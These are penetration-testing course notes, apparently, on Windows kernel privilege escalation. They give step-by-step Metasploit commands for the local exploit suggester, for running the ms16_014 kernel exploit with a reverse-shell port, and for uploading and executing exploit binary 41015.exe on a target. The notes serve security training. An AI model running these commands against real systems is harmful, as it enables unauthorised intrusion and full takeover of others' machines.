# Windows Kernel Exploits

## Privilege Escalation
- Privilege Escalation involves exploiting vulnerabilities or misconfigurations to elevate access from a standard user to one with administrative or root privileges.
- This is critical in a penetration test to gain full control of a system after an initial compromise.
- Once a foothold is gained, escalating privileges allows you to perform tasks that require higher-level access.

## Windows Kernel
- The Kernel is the core component of an operating system, managing system resources and hardware interactions.
- **Windows NT Kernel**: Used by all versions of Microsoft Windows, with two main operation modes:
  - **User Mode**: Limited access to system resources, typically for standard applications and services.
  - **Kernel Mode**: Full access to system resources, used by the OS to manage hardware and execute critical system functions.
  
- Exploiting the Windows kernel allows code execution with the highest system privileges, potentially leading to full control over the target system.

## Windows Kernel Exploitationv
- **Targeting Vulnerabilities**: Windows kernel exploits focus on specific vulnerabilities to execute code with elevated privileges.
- **Privilege Escalation Process**:
  - Identify kernel vulnerabilities.
  - Download, compile, and transfer kernel exploits to the target system.

## Tools & Environment
- **Windows Exploit Suggester**: Compares the target's patch levels against a vulnerability database to detect missing patches and potential exploits.
- **Windows-Kernel-Exploits**: A collection of Windows Kernel exploits sorted by CVE.

## Demo

1. **List Active Sessions**  
   `sessions`  
   - Lists all active sessions. Identifies available sessions, such as a PowerShell or Meterpreter session.

2. **Attempt Privilege Escalation with Meterpreter**  
   `getsystem`  
   - Attempts to elevate privileges to system level within the current session.

3. **Search for the Exploit Suggester Module**  
   `search suggester`  
   - Searches for modules related to exploit suggestion in Metasploit. Prepares to use the Windows Exploit Suggester.

4. **Select the Exploit Suggester Module**  
   `use 0`  
   - Selects the first module from the search results.

5. **Show Module Options**  
   `show options`  
   - Displays configurable options for the selected module.

6. **List Active Sessions Again**  
   `sessions`  
   - Lists sessions to identify the session number needed for further exploitation.

7. **Run the Exploit Suggester**  
   `run`  
   - Enumerates vulnerabilities on the target system and suggests applicable Metasploit modules.

8. **Use the Suggested Kernel Exploit**  
   `use exploit/windows/local/ms16_014_wmi_recv_notif`  
   - Loads the specific kernel exploit module for privilege escalation.

9. **Show Exploit Options**  
   `show options`  
   - Displays the settings required for the loaded exploit module.

10. **Set the Session ID**  
    `set SESSION 3`  
    - Specifies the session to use for the exploit. Adjust according to the active session ID.

11. **Set Local Port**  
    `set LPORT 4422`  
    - Configures the local port for the reverse shell connection.

12. **Execute the Kernel Exploit**  
    `exploit`  
    - Runs the exploit, attempting to gain elevated privileges on the target system.

13. **Check User Identity Post-Exploitation**  
    `getuid`  
    - Confirms the current user’s identity to verify successful privilege escalation.

14. **Background the Current Session**  
    `background`  
    - Backgrounds the current session, keeping it active while allowing further actions.

15. **Switch to the Unprivileged Session**  
    `session 3`  
    - Switches to an unprivileged session for verification.

16. **Check User Identity Again**  
    `getuid`  
    - Verifies the identity in the unprivileged session.

### Using Windows Exploit Suggester

1. **Open a Shell on the Target**  
   `shell`  
   - Drops to a command shell on the target system.

2. **Gather System Information**  
   `systeminfo`  
   - Collects system information, including installed hotfixes, to assess vulnerabilities.

3. **Copy System Information to a Text File**  
   - Create a text file (`win7.txt`) to save `systeminfo` output for further analysis.

4. **Update the Exploit Suggester Database**  
   `./windows-exploit-suggester.py --update`  
   - Updates the vulnerability database for the Windows Exploit Suggester tool.

5. **Run the Exploit Suggester**  
   `./windows-exploit-suggester.py --database 20xx-xx-xx-mssb.xls --systeminfo ~/Desktop/win7.txt`  
   - Compares the system info with the database to suggest applicable exploits.

6. **Transfer the Exploit to the Target System**  
   `upload ~/Downloads/41015.exe`  
   - Uploads the selected exploit binary to the target system.

7. **Navigate to the Temp Directory**  
   `cd C:\\tEMP`  
   - Moves to the temporary directory on the target system, a safe location to execute the exploit.

8. **Execute the Exploit**  
   `.\41015.exe`  
   - Runs the uploaded kernel exploit on the target system.

9. **Check for Elevated Privileges**  
   `whoami`  
   - Confirms successful privilege escalation by checking the user identity, expecting "nt authority\system".
  
  THis metasploit module can be used to identify kernel exploits on a target::
  multi/recon/local_exploit_suggester

# Bypassing UAC With UACMe 

  
